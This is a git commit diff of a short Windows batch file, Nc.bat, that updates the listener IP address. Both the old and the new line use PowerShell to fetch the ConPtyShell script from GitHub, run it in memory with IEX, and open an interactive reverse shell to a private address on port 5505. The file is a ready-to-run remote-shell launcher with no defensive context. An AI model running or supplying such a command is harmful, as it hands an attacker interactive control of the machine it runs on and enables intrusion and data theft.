d6fb87104402a6024296a526324b7cf48fa86cd8
skydrige <98223735+skydrige@users.noreply.github.com>
2023-03-18 13:10:20 +0530

    Update Nc.bat

--- Nc.bat
+++ Nc.bat
@@ -1,5 +1,5 @@
 @echo off
 
-powershell -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.116 5505"
+powershell -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.19.54 5505"
 
 pause
